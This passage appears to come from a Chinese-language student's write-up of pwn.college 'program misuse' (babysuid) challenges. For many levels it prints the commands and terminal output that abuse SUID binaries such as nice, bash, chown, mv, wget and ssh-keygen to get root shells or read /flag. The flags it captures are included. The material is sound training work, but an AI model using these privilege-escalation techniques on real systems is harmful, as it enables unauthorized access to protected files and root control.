-p\uff1a\u8fd9\u662f\u4e00\u4e2a\u9009\u9879\uff0c\u7528\u4e8e\u544a\u8bc9\u65b0\u7684shell\u8fdb\u7a0b\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u4f1a\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4ece\u73af\u5883\u53d8\u91cf\u6587\u4ef6\uff08\u5982/etc/environment\u3001/etc/profile\u3001~/.bashrc\u7b49\uff09\u4e2d\u8bfb\u53d6\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u65b0\u7684shell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u56e0\u6b64\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u6548\u679c\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u8fd9\u53ef\u4ee5\u7528\u4e8e\u6d4b\u8bd5shell\u811a\u672c\u6216\u547d\u4ee4\u5bf9\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\uff0c\u6216\u8005\u5728\u4e24\u4e2a\u4e0d\u540c\u7684shell\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\u73af\u5883\u53d8\u91cf\u3002 \u770b\u8d77\u6765\u5c31\u662f\u8d4b\u6743\uff0c\u7136\u540e\u4f1a\u62ff\u5230\u4e00\u4e2a\u65b0\u7684shell\u63d0\u793a\u7b26 level27 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-27:~$ sh file.sh Welcome to ./babysuid_level27! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/nice. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level27) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nice! nice \u5de5\u5177:\u7528\u4e8e\u4ee5\u6307\u5b9a\u7684\u8fdb\u7a0b\u8c03\u5ea6\u4f18\u5148\u7ea7\u542f\u52a8\u5176\u4ed6\u7684\u7a0b\u5e8f\u3002 hacker@program-misuse-level-27:~$ nice /bin/sh -p # cat /flag pwn.college{celMGA3nJomrVQwA5iPwIY2IORz.0VO2EDL2QjMyMzW} # \u8fd9\u6837\u624d\u662f\u9898\u76ee\u60f3\u8981\u7684\uff0c\u6211\u50bb\u4e86 level28 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-28:~$ sh file.sh Welcome to ./babysuid_level28! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/timeout. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/timeout! timeout \u5de5\u5177\uff1a\u7528\u6765\u6307\u5b9a\u65f6\u95f4\u540e\u6740\u6b7b\u8fdb\u7a0b\u7684\u3002 hacker@program-misuse-level-28:~$ timeout 1h /bin/sh -p # cat /flag pwn.college{sWxHBmerdB7TO79CXDlkRtygh4x.0FM3EDL2QjMyMzW} # \u8fd9\u4e2a\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u4e00\u4e2a\u65f6\u95f4 level29 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-29:~$ sh file.sh Welcome to ./babysuid_level29! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/stdbuf. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level29) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf! stdbuf \u5de5\u5177\uff1a\u4fee\u6539\u6807\u51c6\u6d41\u7684\u7f13\u51b2\u6a21\u5f0f\u548c\u5927\u5c0f hacker@program-misuse-level-29:~$ stdbuf --input=512K /bin/sh -p # cat /flag pwn.college{IHf3mOmt5d10g3StOZp5S0AMAfJ.0VM3EDL2QjMyMzW} # \u522b\u7528man\uff0c\u771f\u7684\u4e0d\u597d\u7528 level30 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-30:~$ sh file.sh Welcome to ./babysuid_level30! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/setarch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/setarch! setarch \u5de5\u5177: \u6539\u53d8\u67b6\u6784\u7684\u5de5\u5177 hacker@program-misuse-level-30:~$ setarch i386 /bin/sh -p # cat /flag pwn.college{08T2qH86iHnjvFJb-5bmU9C5kJt.0lM3EDL2QjMyMzW} # \u5b83\u8fd9\u4e2a\u8bf4\u9ed8\u8ba4\u662f/bin/sh\uff0c\u53ef\u4ee5\u5207i386\uff0c\u5728man\u91cc\u5199\u7740\u5462 level31 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-31:~$ sh file.sh Welcome to ./babysuid_level31! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/watch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/watch! watch \u5de5\u5177\uff1a\u6267\u884c\u547d\u4ee4\u7136\u540e\u5168\u5c4f\u8f93\u51fa hacker@program-misuse-level-31:~$ watch -x cat /flag ### \u4f7f\u7528\u540e\u4f1a\u8f93\u51fa\u5230\u5168\u5c4f pwn.college{UMl5SVp_YjbBiTIgIIiAi7i_5fg.01M3EDL2QjMyMzW} \u5f88\u795e\u5947\u7684\u5de5\u5177\uff0c\u7136\u800c\u53d1\u73b0tldr\u4e0d\u600e\u4e48\u5168\uff0c\u53ea\u6709\u5e38\u89c1\u547d\u4ee4\uff0c\u5230CTF\u7684\u73af\u5883\u4e4b\u4e2d\u5c31\u4e0d\u592a\u9002\u7528\u4e86 level32 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-32:~$ sh file.sh Welcome to ./babysuid_level32! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/socat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/socat! socat \uff1a\u662f\u4e2a\u548csocket\u6709\u5173\u7684\u5de5\u5177\u3002 hacker@program-misuse-level-32:~$ socat -u \"file:/flag\" - pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW} hacker@program-misuse-level-32:~$ level33 Requires some light programming to read the flag.! hacker@program-misuse-level-33:~$ sh file.sh Welcome to ./babysuid_level33! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/whiptail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail! whiptail \uff1a\u5c55\u793ashell\u7684\u5bf9\u8bdd\u6846\u7684\u5de5\u5177 hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40 pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW} \u662f\u4e00\u4e2a\u6253\u5f00\u5bf9\u8bdd\u6846\u7684\u5de5\u5177\uff0c\u56e0\u6b64\u601d\u8def\u5c31\u662f\u76f4\u63a5\u5c55\u793a\u51fa\u6765\u5c31\u884c\u4e86\u3002 level34 Requires some light programming to read the flag.! hacker@program-misuse-level-34:~$ sh file.sh Welcome to ./babysuid_level34! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/awk. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/awk! \u8fd9\u6b21\u662f\u4e00\u4e2a\u6211\u4e00\u76f4\u90fd\u4e0d\u600e\u4e48\u4f1a\u7528\u7684\u5de5\u5177\u4e86\u3002\u3002\u3002\u4f60\u5988\u7684 hacker@program-misuse-level-34:~$ awk '{print $1}' /flag pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW} hacker@program-misuse-level-34:~$ awk \u662f\u4e00\u4e2a\u5f88\u6709\u7528\u7684\u5de5\u5177\uff0c\u6709\u65f6\u95f4\u8fd8\u662f\u5f97\u5b66\u4e00\u5b66 level35 Requires some light programming to read the flag.! hacker@program-misuse-level-35:~$ sh file.sh Welcome to ./babysuid_level35! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/sed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sed! \u679c\u7136\uff0c\u5728awk\u4e4b\u540e\u6211\u5c31\u5e94\u8be5\u60f3\u5230\u662fsed hacker@program-misuse-level-35:~$ sed p /flag pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} hacker@program-misuse-level-35:~$ \u4e5f\u8bb8\u6211\u4e4b\u524d\u64cd\u4f5c\u9519\u4e86\u4ec0\u4e48\uff0c\u8fd9\u91cc\u4e0d\u5e94\u8be5\u662f\u4e24\u884cflag\u5427\uff1f level36 Requires some light programming to read the flag.! hacker@program-misuse-level-36:~$ sh file.sh Welcome to ./babysuid_level36! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/ed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ed! ed \u5de5\u5177\uff1a\u662f\u4e2a\u7f16\u8f91\u5668\uff0c\u662f\u4ea4\u4e92\u5f0f\u7684 hacker@program-misuse-level-36:~$ ed /flag 57 .p pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW} \u663e\u793a\u5168\u6587 level37 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-37:~$ sh file.sh Welcome to ./babysuid_level37! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chown. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chown! chown \u5de5\u5177\uff1a\u6539\u53d8\u6587\u4ef6\u7684\u6240\u6709\u8005\u548c\u7ec4\u7684 hacker@program-misuse-level-37:~$ chown hacker /flag hacker@program-misuse-level-37:~$ cat /flag pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW} hacker@program-misuse-level-37:~$ \u8fd9\u5c31\u662f\u7b80\u5355\u7684\u8d4b\u6743\u4e86 level38 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-38:~$ sh file.sh Welcome to ./babysuid_level38! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chmod. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chmod! \u8fd9\u4e2a\uff0c\u6ca1\u4eba\u4e0d\u4f1a\u5427 hacker@program-misuse-level-38:~$ chmod 777 /flag hacker@program-misuse-level-38:~$ cat /flag pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW} hacker@program-misuse-level-38:~$ level39 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-39:~$ sh file.sh Welcome to ./babysuid_level39! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/cp. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cp! \u4e00\u5f00\u59cb\u60f3\u641e\u4e2a\u786c\u94fe\u63a5\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u884c\uff0c\u7136\u540e\u8f93\u51fa\u5230 \u6807\u51c6\u8f93\u51fa\u6d41 \u5c31\u884c\u4e86 hacker@program-misuse-level-39:~$ cp /flag /dev/stdout pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW} hacker@program-misuse-level-39:~$ level40 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! \u8fd9\u9898\uff0c\u5341\u5206\u7684\u79bb\u8c31\u554a\uff0c\u5b8c\u5168\u4e0d\u4f1a\u505a\uff0c\u770b\u7684\u7b54\u6848\uff0c\u5b9e\u5728\u662f\u592a\u9a9a\u6c14\u4e86\uff0c\u4f7f\u7528mv\u628acat\u8986\u76d6mv hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv hacker@program-misuse-level-40:~$ sh file.sh Welcome to ./babysuid_level40! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/mv. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/mv! hacker@program-misuse-level-40:~$ mv /flag pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW} hacker@program-misuse-level-40:~$ ///@TODO:\u8fd9\u4e2a\u503c\u5f97\u8bb0\u5f55\u4e00\u4e0b\uff01 \u8fd9\u4e2a\u9898\u8ba9\u6211\u60f3\u8d77\u4e86\u4e00\u4e2a\u770b\u5230\u7684\u5185\u5bb9\uff1a \u5982\u679c\u6211\u4eec\u5728\u547d\u4ee4\u4e4b\u4e2d\u4e0d\u4f7f\u7528\u7ba1\u9053\u800c\u4f7f\u7528\u91cd\u5b9a\u5411\uff08\u8fd9\u662f\u65b0\u624b\u53ef\u80fd\u4f1a\u72af\u7684\u9519\u8bef\uff09\u90a3\u4e48\u524d\u4e00\u4e2a\u8f93\u51fa\u4f1a\u91cd\u5199\u5230\u540e\u9762\u7684\u547d\u4ee4\u4e4b\u4e2d\u9020\u6210\u6df7\u4e71\uff0c\u6bd4\u5982 cat /flag > more level41 Lets you read the flag because they let you program anything! hacker@program-misuse-level-41:~$ sh file.sh Welcome to ./babysuid_level41! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/perl. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/perl! perl \u662f\u4e2a\u811a\u672c\u89e3\u91ca\u5668\uff0c hacker@program-misuse-level-41:~$ perl -ne \"print if pwn.college\" /flag perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \"C.UTF-8\", LANG = \"en_US.UTF-8\" are supported and installed on your system. perl: warning: Falling back to the standard locale (\"C\"). pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW} hacker@program-misuse-level-41:~$ \u6253\u5370\u6709pen.college\u7684\u884c level42 Lets you read the flag because they let you program anything! hacker@program-misuse-level-42:~$ sh file.sh Welcome to ./babysuid_level42! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/python. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/python! \u4f7f\u7528python >>> with open(\"/flag\",\"r\") as f: ... print(f.read()) ... pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW} >>> level43 Lets you read the flag because they let you program anything! hacker@program-misuse-level-43:~$ sh file.sh Welcome to ./babysuid_level43! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/ruby. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ruby! \u7528ruby\u5199\u811a\u672c # \u6253\u5f00\u6587\u4ef6 File.open('/flag', 'r') do |f| # \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 content = f.read # \u8f93\u51fa\u6587\u4ef6\u5185\u5bb9 puts content end hacker@program-misuse-level-43:~$ ruby level43.rb pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW} hacker@program-misuse-level-43:~$ level44 Lets you read the flag because they let you program anything! hacker@program-misuse-level-44:~$ sh file.sh Welcome to ./babysuid_level44! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/bash. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bash! bash\uff0c\u53c2\u7167\u4e4b\u524d\u7684\u9898\u62ff\u5230\u63d0\u793a\u7b26 hacker@program-misuse-level-44:~$ bash -p bash-5.0# cat /flag pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW} bash-5.0# level45 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-45:~$ sh file.sh Welcome to ./babysuid_level45! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/date. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/date! \u624b\u518c\u91cc\u5199\u4e86-f\u8bfb\u6587\u4ef6 hacker@program-misuse-level-45:~$ date -f /flag date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}' hacker@program-misuse-level-45:~$ level46 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-46:~$ sh file.sh Welcome to ./babysuid_level46! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/dmesg. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg! \u663e\u793a\u5f00\u673a\u65f6\u95f4\u4e4b\u7c7b\u7684\u4e1c\u897f hacker@program-misuse-level-46:~$ dmesg -F /flag [ 0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW} hacker@program-misuse-level-46:~$ \u90fd\u662f\u770b\u624b\u518c level47 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-47:~$ sh file.sh Welcome to ./babysuid_level47! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wc! wc \u4e00\u822c\u7528\u4e8e\u7edf\u8ba1\u884c\u53f7\u3001\u5b57\u6570\u4ec0\u4e48\u7684\u3002 hacker@program-misuse-level-47:~$ wc --files0-from=/flag wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\\n': No such file or directory hacker@program-misuse-level-47:~$ \u4ece\u624b\u518c\u6765\u770b\u5c31\u4e0a\u9762\u8fd9\u4e2a\u4e0d\u662f\u7edf\u8ba1\u6570\u91cf\u7684\uff0c\u56e0\u6b64\u5c31\u5b83\u4e86\uff01 level48 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-48:~$ sh file.sh Welcome to ./babysuid_level48! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/gcc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gcc! \u6709\u70b9\u513f\u610f\u601d\uff0cgcc\u90fd\u51fa\u6765\u4e86 hacker@program-misuse-level-48:~$ gcc -x c -E /flag # 1 \"/flag\" # 1 \"<built-in>\" # 1 \"<command-line>\" # 31 \"<command-line>\" # 1 \"/usr/include/stdc-predef.h\" 1 3 4 # 32 \"<command-line>\" 2 # 1 \"/flag\" pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW} hacker@program-misuse-level-48:~$ \u5b83\u8fd9\u4e2a\u5fc5\u987b\u8981\u6307\u5b9a\u8bed\u8a00\uff0c\u4e0d\u7136\u4e0d\u80fd\u8fd0\u884c ///@TODO: \u8fd9\u4e2a\u4e00\u5b9a\u8981\u53bb\u770b\u5b98\u65b9\u89e3\u7b54\uff0c\u76f4\u63a5\u5728\u4e00\u4e2a\u7a0b\u5e8f\u91cc\u9762include '/flag'\uff0c\u7136\u540e\u9760\u62a5\u9519\u5f97\u5230flag\uff0c\u975e\u5e38\u6709\u542f\u53d1 level49 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-49:~$ sh file.sh Welcome to ./babysuid_level49! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/as. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/as! as :\u6c47\u7f16\u8bed\u8a00\u7684\u7f16\u8bd1\u5668 hacker@program-misuse-level-49:~$ as -g /flag /flag: Assembler messages: /flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}' hacker@program-misuse-level-49:~$ \u901a\u8fc7\u8c03\u8bd5\u8f93\u51fa level50 Just straight up wasn't designed to let you read files! hacker@program-misuse-level-50:~$ sh file.sh Welcome to ./babysuid_level50! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wget. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wget! wget :\u4e0b\u8f7d\u5668 hacker@program-misuse-level-50:~$ nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 [1] 5873 --2023-07-22 13:39:17-- http://127.0.0.1:8888/ Connecting to 127.0.0.1:8888... connected. POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 127.0.0.1:8888 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 57 HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW} \u6709\u4e2a\u53eb\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\uff0c\u8fd9\u4e2a\u770b\u4e86\u4e00\u4e2a\u522b\u4eba\u7684\u7b54\u6848 level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)! hacker@program-misuse-level-51:~$ sh file.sh Welcome to ./babysuid_level51! This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!). I just set the SUID bit on /usr/bin/ssh-keygen. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen! \u8fd9\u4e2a\u6211\u662f\u4e00\u70b9\u513f\u90fd\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u8bb2\u89e3\u624d\u660e\u767d\uff0cG \u8fd9\u4e2a\u5c31\u662f\u5199\u4e00\u4e2aC/C++\u7a0b\u5e8f\uff0c\u91cc\u9762\u8981\u6709C_GetFunctionList\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u7528sendfile\u6765open\u6587\u4ef6\u3002 \u7136\u540e\u4f7f\u7528gcc\u7f16\u8bd1\u6210.so\u6587\u4ef6\uff0c\u6700\u540e\u4f7f\u7528ssh-keygen -D\u5373\u53ef\u3002 hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW} C_GetFunctionList for provider ./level51.so failed: 57 cannot read public key from pkcs11 hacker@program-misuse-level-51:~$ \u503c\u5f97\u8bb0\u5f55\u7684\u5185\u5bb9 \u5173\u4e8emv \u90a3\u5757\u513f\u7684\uff0c[\u4e00\u4e2a\u535a\u5ba2]\uff08https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619\uff09 \u6700\u540e\u4e00\u4e2a\u9898\u7684 \u8bb2\u89e3 ,\u8fd9\u73a9\u610f\u513f\u4e0d\u8bb2\u662f\u771f\u4e0d\u4f1a\uff0c\u592a\u83dc\u4e86","title":"program misuse"},{"location":"en/CSE466/program-misuse/#knowledge","text":"","title":"knowledge"},{"location":"en/CSE466/program-misuse/#_1","text":"linux\u3001\u547d\u4ee4\u884c\u3001\u8fdb\u7a0b\u3001\u6587\u4ef6\u7cfb\u7edf\u3001\u76ee\u5f55\u3001\u8f6f\u8fde\u63a5\u548c\u786c\u94fe\u63a5\u3001\u8def\u5f84\uff08\u7edd\u5bf9\u3001\u76f8\u5bf9\uff09\u3001\u7ba1\u9053\u3001\u91cd\u5b9a\u5411","title":"\u57fa\u672c\u77e5\u8bc6"},{"location":"en/CSE466/program-misuse/#ref","text":"\u5173\u4e8e\u8f6f\u8fde\u63a5\uff0c\u8fd9\u91cc\u6709\u51e0\u4e2a\u4e0d\u9519\u7684\u53c2\u8003 - \u633a\u6e05\u695a\u7684\u8bb2\u89e3 - \u83dc\u9e1f \u7136\u540e\u662f\u6743\u9650\u3001\u63d0\u6743\u7684\u5185\u5bb9 \u8fd9\u91cc\u9700\u8981\u660e\u767d\u6743\u9650\u3001\u7528\u6237\u3001\u7528\u6237\u7ec4\u8fd9\u4e9b\u6982\u5ff5\uff0c\u4ee5\u53ca\u975e\u5e38\u975e\u5e38\u91cd\u8981\u7684uid gid\u7b49\u5185\u5bb9 SUID: execute with the eUID of the file owner rather than the parent process. SGID: execute with the eGID of the file owner rather than the parent process. Sticky: used for shared directories to limit file removal to file owners. Three different type of user and group IDs: Effective (eUID, eGID): the UID/GID used for most access checks. Real (UID, GID): the \"real\" UID (or GID) of the process owner, used for things such as signal checks. Saved: a UID/GID that your process could switch its eUID/eGID to. Used for temporarily dropping privileges.","title":"ref"},{"location":"en/CSE466/program-misuse/#ref_1","text":"\u4e00\u4e2a\u535a\u5ba2 \u8fd9\u4e2a\u535a\u5ba2\u7684\u98ce\u683c\u6211\u5f88\u559c\u6b22\uff0c\u54ea\u5929\u5077\u8fc7\u6765","title":"ref"},{"location":"en/CSE466/program-misuse/#challenges","text":"","title":"challenges"},{"location":"en/CSE466/program-misuse/#useful-shell","text":"#!/bin/bash # \u8fdb\u5165/challenge\u76ee\u5f55 cd /challenge # \u83b7\u53d6\u8be5\u76ee\u5f55\u4e0b\u552f\u4e00\u7684\u6587\u4ef6\u540d filename=$(ls) # \u6267\u884c\u8be5\u6587\u4ef6 ./$filename then sh filename.sh","title":"useful shell"},{"location":"en/CSE466/program-misuse/#level1-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-1:/challenge$ ./babysuid_level1 Welcome to ./babysuid_level1! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/cat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cat! hacker@program-misuse-level-1:/challenge$ \u5df2\u7ecf\u7ed9\u6211uid\u4e86\uff0c\u7136\u540e\u6211\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef hacker@program-misuse-level-1:/$ ls bin boot challenge dev etc flag home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var hacker@program-misuse-level-1:/$ cat flag pwn.college{gtmGRqQdewLiKKwB2Wi1NeBxX3w.01M0EDL2QjMyMzW} hacker@program-misuse-level-1:/$","title":"level1 Lets you directly read the flag!"},{"location":"en/CSE466/program-misuse/#level2-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-2:/challenge$ ./babysuid_level2 Welcome to ./babysuid_level2! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/more. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/more! hacker@program-misuse-level-2:/challenge$ \u8fd9\u4e2a\u662f\u7528 more \u8bfb\u53d6 hacker@program-misuse-level-2:/challenge$ more /flag pwn.college{g0orxg7_IfgidrE5G2scOM8wdRx.0FN0EDL2QjMyMzW} hacker@program-misuse-level-2:/challenge$","title":"level2 Lets you directly read the flag!"},{"location":"en/CSE466/program-misuse/#level3-lets-you-directly-read-the-flag","text":"hacker@program-misuse-level-3:/challenge$ ./babysuid_level3 Welcome to ./babysuid_level3! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/less. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/less! hacker@program-misuse-level-3:/challenge$ \u8fd9\u6b21\u662f\u7528 less hacker@program-misuse-level-3:/challenge$ less /flag pwn.college{onJWxeGXCk8o-LqXlLemr-Xzk2W.0VN0EDL2QjMyMzW} /flag (END) 